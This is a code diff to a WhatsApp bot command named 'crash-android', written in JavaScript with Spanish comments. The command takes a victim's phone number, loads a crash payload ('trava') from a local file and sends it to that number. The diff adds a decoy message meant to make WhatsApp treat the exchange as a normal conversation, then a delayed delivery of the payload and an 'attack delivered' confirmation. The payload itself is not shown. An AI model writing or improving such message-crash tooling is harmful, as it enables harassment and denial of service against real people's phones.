@@ -1,8 +1,3 @@
-/* * 👑 MISA CRASH-ANDROID
- * Canal: https://whatsapp.com/channel/0029Vav6SNC7z4kofN80pW27
- * Github: https://github.com/yannielmedrano1-sys/Misa-Bot
- */
-
 import fs from 'fs';
 import path from 'path';
 
@@ -11,11 +6,10 @@ const crashAndroidMisa = {
     alias: ['ca', 'crash', 'ola'],
     category: 'tools',
     noPrefix: true,
-    isOwner: false, // Lo ponemos en true para que solo tú (Yanniel) puedas usarlo
+    isOwner: false,
 
     run: async (conn, m, { args, command }) => {
         try {
-            // 1. Validación de número (Usando remoteJid como en tu menú)
             const chat = m.key.remoteJid;
 
             if (!args[0]) {
@@ -23,33 +17,42 @@ const crashAndroidMisa = {
                 return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
             }
 
-            // 2. Limpieza de JID
             const num = args[0].replace(/[^0-9]/g, '');
             if (!num || num.length < 8) {
                 return await conn.sendMessage(chat, { text: '❌ *Número inválido.*' }, { quoted: m });
             }
             const targetJid = `${num}@s.whatsapp.net`;
 
-            // 3. Leer la trava desde tu carpeta /travas/
             const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
-            
             if (!fs.existsSync(pathTrava)) {
-                return await conn.sendMessage(chat, { text: '❌ No encontré el archivo: `travas/ola.js`' }, { quoted: m });
+                return await conn.sendMessage(chat, { text: '❌ No encontré: `travas/ola.js`' }, { quoted: m });
             }
 
             const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');
 
-            // 4. Ejecución (Reacción y envío)
-            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
+            // 1. Reacción de espera
+            await conn.sendMessage(chat, { react: { text: '⏳', key: m.key } });
 
-            // Enviamos el "misil" al objetivo
-            await conn.sendMessage(targetJid, { text: contenidoTrava });
+            // 2. PRIMER ENVÍO: Mensaje "señuelo" para abrir el canal
+            // Esto hace que WhatsApp crea que es una conversación normal
+            await conn.sendMessage(targetJid, { text: '...' });
 
-            // 5. Confirmación final con estética Misa
-            await conn.sendMessage(chat, { 
-                text: `✅ *Ataque enviado con éxito a @${num}*`,
-                mentions: [targetJid]
-            }, { quoted: m });
+            // 3. SEGUNDO ENVÍO: La carga pesada con un pequeño retraso
+            setTimeout(async () => {
+                try {
+                    await conn.sendMessage(targetJid, { text: contenidoTrava });
+                    
+                    // Reacción final de éxito
+                    await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
+                    
+                    await conn.sendMessage(chat, { 
+                        text: `✅ *Ataque entregado con éxito a @${num}*`,
+                        mentions: [targetJid]
+                    }, { quoted: m });
+                } catch (e) {
+                    console.error('Fallo al enviar trava:', e);
+                }
+            }, 1500); // 1.5 segundos de espera entre mensajes
 
         } catch (err) {
             console.error('Error en crash-android:', err);
